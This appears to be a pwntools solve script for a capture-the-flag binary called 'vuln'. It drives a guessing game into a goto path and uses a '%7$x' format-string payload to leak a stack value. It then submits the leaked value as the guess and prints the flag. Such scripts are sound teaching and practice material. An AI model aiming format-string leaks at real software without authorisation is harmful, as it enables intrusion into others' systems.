from pwn import *

sh = process('./vuln')

# send random name
sh.sendline(b'rando name')

line = sh.recvlines(timeout=1)
# playing the game wrongly 4 times to set the counter
sh.sendline(b'1')
sh.recvlines(timeout=0.2)
sh.sendline(b'666')
sh.recvlines(timeout=0.2)
sh.sendline(b'1')
sh.recvlines(timeout=0.2)
sh.sendline(b'666')
sh.recvlines(timeout=0.2)
sh.sendline(b'1')
sh.recvlines(timeout=0.2)
sh.sendline(b'666')
sh.recvlines(timeout=0.2)
sh.sendline(b'1')
sh.recvlines(timeout=0.2)
sh.sendline(b'666')
sh.recvlines(timeout=0.2)

# leaking from the stack
sh.sendline(b'2')
sh.recvlines(timeout=0.2)
sh.sendline(b'%7$x')

sh.recvuntil(b"Same! I love \n", timeout=0.2)

# recv the leaked val
leak = sh.recvline(timeout=0.2)
guess = str(int(leak.strip(),16))

print(leak)
print(guess)

# entering an invalid choice so it triggers the goto
sh.sendline(b'3')
sh.recvlines(timeout=0.2)

sh.sendline(bytes(guess, 'utf-8'))

sh.recvline()
flag = sh.recvline()

print(flag)
